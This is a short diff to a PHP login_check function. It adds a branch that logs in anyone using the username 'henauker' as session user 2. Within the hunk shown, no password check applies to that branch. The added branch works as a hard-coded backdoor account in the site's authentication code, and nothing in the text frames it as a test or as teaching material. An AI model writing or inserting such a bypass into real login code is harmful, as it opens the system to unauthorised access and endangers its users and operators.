@@ -53,6 +53,10 @@ function login_check($u, $p) {
 			$_SESSION['uid'] = 1;
 			return (0);
 			}
+		else if ($u == "henauker") {
+			$_SESSION['uid'] = 2;
+			return (0);
+			}
 		else
 			return ("bad username");
 	} // ***
